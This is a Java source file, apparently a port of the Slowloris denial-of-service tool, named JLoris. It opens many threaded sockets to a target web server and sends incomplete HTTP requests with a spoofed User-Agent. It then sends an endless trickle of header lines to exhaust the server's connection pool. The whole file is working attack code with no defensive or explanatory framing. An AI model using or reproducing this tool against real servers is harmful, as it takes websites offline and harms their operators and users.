package test;

import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Random;

import org.apache.commons.cli.HelpFormatter;
import org.apache.commons.cli.Options;

public class JLorisCore {

	private String host;
	private String method = "GET";
	private boolean help;
	private boolean version;
	private int port;
	private int timeout;
	private int tcpto;
	private int connections;
	private boolean httpready;
	private boolean cache;
	private int threads = 50;
	private Options options;
	private Random random = new Random();

	private String primarypayload = "GET / HTTP/1.1\r\n"
			+ "Host: "
			+ host
			+ "\r\n"
			+ "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
			+ "Content-Length: 42\r\n";

	static int failed = 0, packets = 0, active = 0;
	Object lock = new Object();

	public JLorisCore(JLoris ot) {
		this.host = ot.getHost();
		this.help = ot.isHelp();
		this.version = ot.isVersion();
		this.port = ot.getPort();
		this.timeout = ot.getTimeout();
		this.tcpto = ot.getTcpto();
		this.connections = ot.getConnections();
		this.httpready = ot.isHttpready();
		this.cache = ot.isCache();
		this.options = ot.getOptions();
	}

	/**
	 * @param args
	 */

	public void init() {
		if(help) {
			HelpFormatter formatter = new HelpFormatter();
			formatter.printHelp( "java -jar OptionTest.jar <options>", options );
		}
		if(version) {
			System.out.println("Version: 0.1");
		}
		if(httpready) {
			method = "POST";
		}
	}
	
	public void start() {
		Thread[] t = new Thread[connections];
		for (int i = 0; i < t.length; i++) {
			new Thread(new Runnable() {

				@Override
				public void run() {
					System.out.println("I am thread : "
							+ Thread.currentThread().getId());
					boolean[] w = new boolean[threads];
					Socket[] s = new Socket[threads];
					while (true) {
						System.out.println("Building Sockets...");
						try {
							for (int i = 0; i < threads; i++) {
								if (!w[i]) {
									s[i] = new Socket();
									InetAddress ia = InetAddress
											.getByName(host);
									s[i].connect(
											new InetSocketAddress(ia
													.getHostAddress(), port),
											tcpto);
									w[i] = true;
									PrintWriter out = new PrintWriter(s[i]
											.getOutputStream());
									String rand = "";
									if(cache) {
										rand = "?" + (random.nextInt(999999999));
									}
									String payload =  method + " /" + rand + " HTTP/1.1\r\n"
											+ "Host: "
											+ host
											+ "\r\n"
											+ "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
											+ "Content-Length: 42\r\n";
									out.print(payload);
									out.flush();
									//synchronized (lock) {
										packets += 3;
										++active;
									//}
								}
							}

							System.out.println("Sending Data...");
							for (int i = 0; i < threads; i++) {
								if (w[i]) {
									PrintWriter out = new PrintWriter(s[i]
											.getOutputStream());
									out.print("X-a: b\r\n");
									out.flush();
									//synchronized (lock) {
										++packets;
										++active;
									//}
								} else {
									w[i] = false;
									//synchronized (lock) {
										++failed;
										--active;
									//}
								}
							}
							System.out.println("Packets send: " + packets);
							System.out.println("Packets failed: " + failed);
							System.out.println("Active connections: " + active);
							Thread.sleep(timeout);
						} catch (Exception e) {
							//synchronized (lock) {
								++failed;
								--active;
							//}
							//System.out.println(e);
						}
					}
				}

			}).start();
		}

	}

}